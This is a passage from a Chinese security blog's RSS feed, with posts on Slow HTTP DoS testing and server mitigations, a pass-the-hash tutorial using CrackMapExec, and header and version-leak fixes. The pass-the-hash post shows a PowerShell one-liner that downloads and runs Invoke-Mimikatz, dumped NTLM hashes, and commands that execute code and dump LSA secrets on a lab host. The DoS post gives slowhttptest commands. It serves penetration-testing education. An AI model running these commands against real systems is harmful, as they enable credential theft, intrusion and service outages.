&lt;p&gt;配置 &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; 发送 &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; 响应头，把下面这行添加到 &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;server&lt;/code&gt; 或者 &lt;code class=&quot;highlighter-rouge&quot;&gt;location&lt;/code&gt; 的配置中:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;add_header X-Frame-Options SAMEORIGIN;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;iis&quot;&gt;IIS&lt;/h3&gt;

&lt;p&gt;配置 &lt;code class=&quot;highlighter-rouge&quot;&gt;IIS&lt;/code&gt; 发送 &lt;code class=&quot;highlighter-rouge&quot;&gt;X-Frame-Options&lt;/code&gt; 响应头，添加下面的配置到 &lt;code class=&quot;highlighter-rouge&quot;&gt;Web.config&lt;/code&gt; 文件中:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;system.webServer&amp;gt;
  ...
 
  &amp;lt;httpProtocol&amp;gt;
    &amp;lt;customHeaders&amp;gt;
      &amp;lt;add name=&quot;X-Frame-Options&quot; value=&quot;SAMEORIGIN&quot; /&amp;gt;
    &amp;lt;/customHeaders&amp;gt;
  &amp;lt;/httpProtocol&amp;gt;
 
  ...
&amp;lt;/system.webServer&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

</description>
        <pubDate>Mon, 16 Apr 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-04-16/3</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-16/3</guid>
        
        
        <category>Web安全测试学习手册</category>
        
      </item>
    
      <item>
        <title>Slow HTTP DOS</title>
        <description>&lt;p&gt;《Web安全测试学习手册》- Slow HTTP DOS
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-slow-http-dos---介绍&quot;&gt;0x00 Slow HTTP DOS - 介绍&lt;/h2&gt;

&lt;h3 id=&quot;1什么是slow-http-dos&quot;&gt;1）什么是Slow HTTP DOS&lt;/h3&gt;

&lt;p&gt;Slow HTTP DOS(Slow HTTP Denial of Service Attack)，译为缓慢的HTTP拒绝服务，这类攻击方式出现在许多公开协议中。&lt;/p&gt;

&lt;h3 id=&quot;2slow-http-dos的特点&quot;&gt;2）Slow HTTP DOS的特点&lt;/h3&gt;

&lt;p&gt;Slow HTTP DOS是一个应用层拒绝服务攻击，主要针对协议为HTTP，攻击的成本很低，并且能够消耗服务器端资源，占用客户端连接数，导致正常用户无法连接服务器。&lt;/p&gt;

&lt;h2 id=&quot;0x01-slow-http-dos---风险等级&quot;&gt;0x01 Slow HTTP DOS - 风险等级&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;中&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-slow-http-dos---原理&quot;&gt;0x02 Slow HTTP DOS - 原理&lt;/h2&gt;

&lt;p&gt;既然是一个HTTP协议的缓慢攻击，这就要从HTTP协议说起了。&lt;/p&gt;

&lt;p&gt;首先HTTP协议的报文都是一行一行的，类似于：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET / HTTP/1.1\r\n
Host : payloads.online\r\n
Connection: keep-alive\r\n
Keep-Alive: 900\r\n
Content-Length: 100000000\r\n
Content_Type: application/x-www-form-urlencoded\r\n
Accept: *.*\r\n
\r\n
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;那么报文中的&lt;code class=&quot;highlighter-rouge&quot;&gt;\r\n&lt;/code&gt;是什么？&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;\r\n&lt;/code&gt;代表一行报文的结束也被称为空行（CRLF），而&lt;code class=&quot;highlighter-rouge&quot;&gt;\r\n\r\n&lt;/code&gt;代表整个报文的结束&lt;/p&gt;

&lt;p&gt;从上面贴出的&lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt;请求包可以看出，我们的客户端请求到服务器后，告知服务器这个连接需要保留。&lt;/p&gt;

&lt;p&gt;通常我们知道HTTP协议采用“请求-应答”模式，当使用普通模式，即非KeepAlive模式时，每个请求/应答客户和服务器都要新建一个连接，完成之后立即断开连接&lt;code class=&quot;highlighter-rouge&quot;&gt;（HTTP协议为无连接的协议）&lt;/code&gt;；当使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Keep-Alive模式（又称持久连接、连接重用）&lt;/code&gt;时，Keep-Alive功能使客户端到服 务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。&lt;/p&gt;

&lt;p&gt;那么当我们客户端发送一个报文，不以&lt;code class=&quot;highlighter-rouge&quot;&gt;CRLF&lt;/code&gt;结尾，而是10s发送一行报文，我们的报文需要80s才能发送完毕，这80s内，服务器需要一直等待客户端的CRLF，然后才能解析这个报文。&lt;/p&gt;

&lt;p&gt;如果客户端使用更多的程序发送这样的报文，那么服务器端会给客户端留出更多的资源来处理、等待这迟迟不传完的报文。假设服务器端的客户端最大连接数是100个，我们使用测试程序先连接上100次服务器端，并且报文中启用Keep-Alive，那么其他正常用户101、102就无法正常访问网站了。&lt;/p&gt;

&lt;h2 id=&quot;0x03-slow-http-dos---常见场景&quot;&gt;0x03 Slow HTTP DOS - 常见场景&lt;/h2&gt;

&lt;p&gt;大多出现在默认安装好的Apache Web中，未合理设置客户端连接数导致的。&lt;/p&gt;

&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;

&lt;p&gt;使用Slow HTTP Test 工具进行检测&lt;/p&gt;

&lt;p&gt;Kali Linux 安装 ：apt-get install slowhttptest&lt;/p&gt;

&lt;p&gt;SlowHTTPTest是一个可配置的应用层拒绝服务攻击测试攻击，它可以工作在Linux，OSX和Cygwin环境以及Windows命令行接口，可以帮助安全测试人员检验服务器对慢速攻击的处理能力。&lt;/p&gt;

&lt;p&gt;这个工具可以模拟低带宽耗费下的DoS攻击，比如慢速攻击，慢速HTTP POST，通过并发连接池进行的慢速读攻击（基于TCP持久时间）等。慢速攻击基于HTTP协议，通过精心的设计和构造，这种特殊的请求包会造成服务器延时，而当服务器负载能力消耗过大即会导致拒绝服务。&lt;/p&gt;

&lt;h3 id=&quot;slow-header&quot;&gt;Slow Header&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;slowhttptest -c 65500 -H -i 10 -r 200 -s 8192 -t SLOWHEADER -u http://payloads.online
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该攻击会像我们刚才讲的慢速传递HTTP报文，占用服务器资源让其等待我们最后的CRLF。&lt;/p&gt;

&lt;h3 id=&quot;slow-read&quot;&gt;Slow Read&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;slowhttptest -c 65500 -X -r 1000 -w 10 -y 20 -t SLOWREAD -n 5 -z 32 -u http://payloads.online
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该攻击会在Web服务器响应内容传输回来的时候，我们客户端缓慢的读取响应报文，这样服务器端也会一直等待客户端来接收完毕。&lt;/p&gt;

&lt;h3 id=&quot;slow-post&quot;&gt;Slow Post&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;slowhttptest -c 65500 -B -i 10 -r 200 -s 8192 -t SLOWBODY -u http://payloads.online
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该攻击会构造一个POST数据包，将数据缓慢传输，使服务器端一直等待接收报文。&lt;/p&gt;

&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;1.设置合适的 timeout 时间（Apache 已默认启用了 reqtimeout 模块），规定了 Header 发送的时间以及频率和 Body 发送的时间以及频率&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;2.增大 MaxClients(MaxRequestWorkers)：增加最大的连接数。根据官方文档，两个参数是一回事，版本不同，MaxRequestWorkers was called MaxClients before version 2.3.13. The old name is still supported.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;3.默认安装的 Apache 存在 Slow Attack 的威胁，原因就是虽然设置的 timeoute，但是最大连接数不够，如果攻击的请求频率足够大，仍然会占满 Apache 的所有连接&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;针对不同的Server其对慢速http拒绝服务攻击防范方法也不同，建议使用以下措施防范慢速http拒绝服务攻击：&lt;/p&gt;

&lt;h3 id=&quot;websphere&quot;&gt;WebSphere&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;1、限制 HTTP 数据的大小
在WebSphere Application Server 中进行如下设置：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;任何单个 HTTP 头的默认最大大小为 32768 字节。可以将它设置为不同的值。&lt;/p&gt;

&lt;p&gt;HTTP 头的默认最大数量为 50。可以将它设置为不同的限制值。&lt;/p&gt;

&lt;p&gt;另一种常见的 DOS 攻击是发送一个请求，这个请求会导致一个长期运行的 GET 请求。WebSphere Application Server Plug-in 中的 ServerIOTimeoutRetry 属性可限制任何请求的重试数量。这可以降低这种长期运行的请求的影响。&lt;/p&gt;

&lt;p&gt;设置限制任何请求正文的最大大小。详见参考链接。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2、设置keepalive参数&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;打开ibm http server安装目录，打开文件夹conf，打开文件httpd.conf,查找KeepAlive值，改ON为OFF,其默认为ON。&lt;/p&gt;

&lt;p&gt;这个值说明是否保持客户与HTTP SERVER的连接，如果设置为ON，则请求数到达MaxKeepAliveRequests设定值时请求将排队，导致响应变慢。&lt;/p&gt;

&lt;h3 id=&quot;weblogic&quot;&gt;Weblogic&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;1、在配置管理界面中的协议-&amp;gt;一般信息下设置 完成消息超时时间小于400&lt;/li&gt;
  &lt;li&gt;2、在配置管理界面中的协议-&amp;gt;HTTP下设置 POST 超时、持续时间、最大 POST 大小为安全值范围。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;nginx&quot;&gt;Nginx&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;1、通过调整$request_method，配置服务器接受http包的操作限制；&lt;/li&gt;
  &lt;li&gt;2、在保证业务不受影响的前提下，调整client_max_body_size, client_body_buffer_size, client_header_buffer_size,large_client_header_buffersclient_body_timeout, client_header_timeout的值，必要时可以适当的增加；&lt;/li&gt;
  &lt;li&gt;3、对于会话或者相同的ip地址，可以使用HttpLimitReqModule and HttpLimitZoneModule参数去限制请求量或者并发连接数；&lt;/li&gt;
  &lt;li&gt;4、根据CPU和负载的大小，来配置worker_processes 和 worker_connections的值，公式是：max_clients = worker_processes * worker_connections。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;apache&quot;&gt;Apache&lt;/h3&gt;

&lt;p&gt;建议使用mod_reqtimeout和mod_qos两个模块相互配合来防护。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;1、mod_reqtimeout用于控制每个连接上请求发送的速率。配置例如：
#请求头部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slowloris型的慢速攻击。
RequestReadTimeout header=10-40,minrate=500
#请求正文部分，设置超时时间初始为10秒，并在收到客户端发送的数据后，每接收到500字节数据就将超时时间延长1秒，但最长不超过40秒。可以防护slow message body型的慢速攻击。
RequestReadTimeout body=10-40,minrate=500
需注意，对于HTTPS站点，需要把初始超时时间上调，比如调整到20秒。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;2、mod_qos用于控制并发连接数。配置例如：&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;当服务器并发连接数超过600时，关闭keepalive&lt;/p&gt;

&lt;p&gt;QS_SrvMaxConnClose 600&lt;/p&gt;

&lt;p&gt;限制每个源IP最大并发连接数为50&lt;/p&gt;

&lt;p&gt;QS_SrvMaxConnPerIP 50
这两个数值可以根据服务器的性能调整。&lt;/p&gt;

&lt;h3 id=&quot;ihs服务器&quot;&gt;IHS服务器&lt;/h3&gt;

&lt;p&gt;请您先安装最新补丁包，然后启用&lt;code class=&quot;highlighter-rouge&quot;&gt;mod_reqtimeout&lt;/code&gt;模块，在配置文件中加入：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LoadModule reqtimeout_module modules/mod_reqtimeout.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为&lt;code class=&quot;highlighter-rouge&quot;&gt;mod_reqtimeout&lt;/code&gt;模块添加配置：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;IfModule mod_reqtimeout.c&amp;gt;
RequestReadTimeout header=10-40,MinRate=500 body=10-40,MinRate=500
&amp;lt;/IfModule&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对于HTTPS站点，建议header=20-40,MinRate=500。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;参见：http://www-01.ibm.com/support/docview.wss?uid=swg21652165&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;f5负载均衡修复建议&quot;&gt;F5负载均衡修复建议&lt;/h3&gt;

&lt;p&gt;F5负载均衡设备有相应的防护模块，如无购买可参考附件中的详细配置过程。&lt;/p&gt;

&lt;p&gt;关于F5的慢速攻击防护配置，请参考以下链接：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://support.f5.com/kb/en-us/solutions/public/10000/200/sol10260.html&lt;/li&gt;
  &lt;li&gt;https://devcentral.f5.com/articles/mitigating-slow-http-post-ddos-attacks-with-irules-ndash-follow-up&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;tomcat服务器&quot;&gt;tomcat服务器&lt;/h3&gt;

&lt;p&gt;解决方案：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;1、设置Tomcat / server.xml文件    connectiontimeout 值，默认为20000ms，修改为8000ms(Tomcat 自身安全漏洞)&lt;/li&gt;
  &lt;li&gt;2、设置AJAX的全局timeout时间（默认为30000ms） $.ajaxSetup({timeout:8000}).&lt;/li&gt;
&lt;/ul&gt;

&lt;address&gt;
感谢&lt;b&gt;&lt;a href=&quot;mailto:lyquan16@gmail.com&quot;&gt;Wingkyun&lt;/a&gt;&lt;/b&gt;给予我的修复建议&lt;br /&gt;
&lt;/address&gt;

</description>
        <pubDate>Mon, 16 Apr 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-04-16/2</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-04-16/2</guid>
        
        
        <category>Web安全测试学习手册</category>
        
      </item>
    
      <item>
        <title>使用CrackMapExec 进行 NTLM Hash传递攻击</title>
        <description>&lt;p&gt;本文介绍一个工具 - CrackMapExec 进行 NTLM Hash传递攻击
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x01-前言&quot;&gt;0x01 前言&lt;/h2&gt;

&lt;p&gt;早期&lt;code class=&quot;highlighter-rouge&quot;&gt;SMB&lt;/code&gt;协议在网络上传输明文口令。后来出现 &lt;code class=&quot;highlighter-rouge&quot;&gt;LAN Manager Challenge/Response &lt;/code&gt;验证机制，简称&lt;code class=&quot;highlighter-rouge&quot;&gt;LM&lt;/code&gt;，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。&lt;/p&gt;

&lt;p&gt;从&lt;code class=&quot;highlighter-rouge&quot;&gt;Win2000&lt;/code&gt;开始默认协议为&lt;code class=&quot;highlighter-rouge&quot;&gt;Kerboros&lt;/code&gt;，下列情况会调用&lt;code class=&quot;highlighter-rouge&quot;&gt;NTLM&lt;/code&gt;：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;遗留客户端或服务器需要登录到网络或本地时。&lt;/li&gt;
  &lt;li&gt;UNIX客户端需要与NT服务器通话时。&lt;/li&gt;
  &lt;li&gt;有正在使用验证&lt;code class=&quot;highlighter-rouge&quot;&gt;NTLM&lt;/code&gt;的服务器信息块&lt;code class=&quot;highlighter-rouge&quot;&gt;（SMB）&lt;/code&gt;后台程序的UNIX客户端时。&lt;/li&gt;
  &lt;li&gt;也即认证方或被认证方有仅支持NTLM情况时。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;它以&lt;code class=&quot;highlighter-rouge&quot;&gt;挑战/响应（Challenge/Response）&lt;/code&gt;顺序为基础。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1.客户端发送用户名和域名到服务器。&lt;/li&gt;
  &lt;li&gt;2.服务器转发到域控制器DC。&lt;/li&gt;
  &lt;li&gt;3.&lt;code class=&quot;highlighter-rouge&quot;&gt;DC&lt;/code&gt;用客户端密码随机产生一个&lt;code class=&quot;highlighter-rouge&quot;&gt;8字节&lt;/code&gt;得挑战&lt;code class=&quot;highlighter-rouge&quot;&gt;（Challenge）&lt;/code&gt;，发送给服务器。&lt;/li&gt;
  &lt;li&gt;4.服务器将挑战转发给客户端。&lt;/li&gt;
  &lt;li&gt;5.客户端用密码经过&lt;code class=&quot;highlighter-rouge&quot;&gt;hash&lt;/code&gt;及&lt;code class=&quot;highlighter-rouge&quot;&gt;DES&lt;/code&gt;加密算法等操作得到一个加密结果响应&lt;code class=&quot;highlighter-rouge&quot;&gt;（Response）&lt;/code&gt;发送给服务器。&lt;/li&gt;
  &lt;li&gt;6.服务器将响应转发给&lt;code class=&quot;highlighter-rouge&quot;&gt;DC&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;7.&lt;code class=&quot;highlighter-rouge&quot;&gt;DC&lt;/code&gt;做同样操作验证客户端响应。&lt;/li&gt;
  &lt;li&gt;8.验证结束，返回结果通知服务器。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x02-ntlm对渗透的作用&quot;&gt;0x02 NTLM对渗透的作用&lt;/h2&gt;

&lt;p&gt;NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限。&lt;/p&gt;

&lt;p&gt;最大的特点就是我们可以使用&lt;code class=&quot;highlighter-rouge&quot;&gt;SMB&lt;/code&gt;执行&lt;code class=&quot;highlighter-rouge&quot;&gt;Command&lt;/code&gt;。&lt;/p&gt;

&lt;h2 id=&quot;0x03-crackmapexec-介绍&quot;&gt;0x03 CrackMapExec 介绍&lt;/h2&gt;

&lt;p&gt;CrackMapExec提供了域环境（活动目录）渗透测试中一站式便携工具，它具有列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表，执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。&lt;/p&gt;

&lt;p&gt;WiKi:https://github.com/byt3bl33d3r/CrackMapExec/wiki&lt;/p&gt;

&lt;h2 id=&quot;0x03-安装crackmapexec&quot;&gt;0x03 安装CrackMapExec&lt;/h2&gt;

&lt;h3 id=&quot;kali-linux&quot;&gt;Kali Linux&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install crackmapexec&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;debianubuntu&quot;&gt;Debian/Ubuntu&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt-get install -y libssl-dev libffi-dev python-dev build-essential
pip install crackmapexec
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;0x04-传递ntlm-hash执行命令&quot;&gt;0x04 传递NTLM Hash执行命令&lt;/h2&gt;

&lt;h3 id=&quot;使用mimikatz获取ntlm-hash&quot;&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;Mimikatz&lt;/code&gt;获取&lt;code class=&quot;highlighter-rouge&quot;&gt;NTLM Hash&lt;/code&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
PS C:\Users\administrator\Documents&amp;gt;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

PS C:\Users\administrator\Documents&amp;gt;Invoke-Mimikatz

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;获取NTLM Hash&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;****
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : PAYLOADS
         * LM       : 5609e3f4c7c56d5fa86fb73c70515bd7
         * NTLM     : dab7de8feeb5ecac65faf9fdc6cac3a9
         * SHA1     : 67302089bba4993f2f845e5992db0a21e64679fa
        tspkg :
         * Username : Administrator
         * Domain   : PAYLOADS
         * Password : ****
        wdigest :
         * Username : Administrator
         * Domain   : PAYLOADS
         * Password : ****
        kerberos :
         * Username : Administrator
         * Domain   : PAYLOADS.ONLINE
         * Password : ****
        ssp :
        credman :

****

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;使用crackmapexec执行命令&quot;&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;CrackMapExec&lt;/code&gt;执行命令&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami
SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Executed command 
SMB         192.168.3.5     445    LIYINGZHEA30B    payloads\administrator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;使用crackmapexec获取本地密码local-security-authoritylsa&quot;&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;CrackMapExec&lt;/code&gt;获取本地密码(Local Security Authority)LSA&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 --lsa
SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumping LSA secrets
SMB         192.168.3.5     445    LIYINGZHEA30B    WinHack:d3a4b1078aba22996575dd38056e3c99:PAYLOADS.ONLINE:PAYLOADS:::
SMB         192.168.3.5     445    LIYINGZHEA30B    Administrator:ff007a95ee46c0240e7f0c4b9b0c890a:PAYLOADS.ONLINE:PAYLOADS:::
SMB         192.168.3.5     445    LIYINGZHEA30B    PAYLOADS\LIYINGZHEA30B$:aad3b435b51404eeaad3b435b51404ee:eda8896ce9133d0bcaf0b6ece9cb0d45:::
SMB         192.168.3.5     445    LIYINGZHEA30B    DPAPI_SYSTEM:01000000faf06c0f43acbed98d62bd9829d053acb06a00f159e3419d193ff5be56c028fe8d7f0053161d9331
SMB         192.168.3.5     445    LIYINGZHEA30B    NL$KM:ac8c8a7ce1dd903d74a231a44fcf5df82db711df62e495da9b5f10c3a52dd618a8abce6975c69fea6a9ed69ff6511c62f9a750b5d696a69c3221dc0f1f849f3d
SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumped 5 LSA secrets to /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.lsa and /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.cached
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;more-&quot;&gt;More …&lt;/h3&gt;

&lt;p&gt;后续再加&lt;/p&gt;
</description>
        <pubDate>Tue, 27 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-03-27/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-27/1</guid>
        
        
        <category>内网渗透</category>
        
      </item>
    
      <item>
        <title>中间件版本信息泄露</title>
        <description>&lt;p&gt;《Web安全测试学习手册》- 中间件版本信息泄露
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-中间件版本信息泄露&quot;&gt;0x00 中间件版本信息泄露&lt;/h2&gt;

&lt;h3 id=&quot;1什么是中间件版本信息泄露&quot;&gt;1）什么是中间件版本信息泄露&lt;/h3&gt;

&lt;p&gt;通常在HTTP报文的响应头中存在的标志、版本号等信息均属于中间件的版本信息泄露。&lt;/p&gt;

&lt;h3 id=&quot;2中间件版本信息泄露的特点&quot;&gt;2）中间件版本信息泄露的特点&lt;/h3&gt;

&lt;p&gt;通常出现在默认安装好的Web中间件上，大部分管理员都不会修改这个标志。&lt;/p&gt;

&lt;h2 id=&quot;0x01-中间件版本信息泄露---风险等级&quot;&gt;0x01 中间件版本信息泄露 - 风险等级&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;低&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02-中间件版本信息泄露---原理&quot;&gt;0x02 中间件版本信息泄露 - 原理&lt;/h2&gt;

&lt;p&gt;由于各大Web服务中间件为了打造品牌效应而在HTTP响应头中添加了标志信息、版本号。&lt;/p&gt;

&lt;h2 id=&quot;0x03-中间件版本信息泄露---常见场景&quot;&gt;0x03 中间件版本信息泄露 - 常见场景&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Tomcat&lt;/li&gt;
  &lt;li&gt;Nginx&lt;/li&gt;
  &lt;li&gt;Apache&lt;/li&gt;
  &lt;li&gt;IIS&lt;/li&gt;
  &lt;li&gt;… 均有此类现象&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x04-测试方案&quot;&gt;0x04 测试方案&lt;/h2&gt;

&lt;p&gt;使用CURL发送OPTIONS、GET、POST、HEAD等请求，查看响应头中的Server行&lt;/p&gt;

&lt;p&gt;命令：&lt;code class=&quot;highlighter-rouge&quot;&gt;curl -I -X GET http://payloads.online&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-04-27/0x01.gif&quot; alt=&quot;0x01&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x05-修复方案&quot;&gt;0x05 修复方案&lt;/h2&gt;

&lt;h3 id=&quot;apache&quot;&gt;Apache&lt;/h3&gt;

&lt;p&gt;将以下配置加入&lt;code class=&quot;highlighter-rouge&quot;&gt;conf/httpd.conf&lt;/code&gt;：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ServerTokens Prod
ServerSignature Off
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;php&quot;&gt;PHP&lt;/h4&gt;

&lt;p&gt;修改&lt;code class=&quot;highlighter-rouge&quot;&gt;php.ini&lt;/code&gt;，将&lt;code class=&quot;highlighter-rouge&quot;&gt;expose_php On&lt;/code&gt;改为：&lt;code class=&quot;highlighter-rouge&quot;&gt;expose_php Off&lt;/code&gt;&lt;/p&gt;

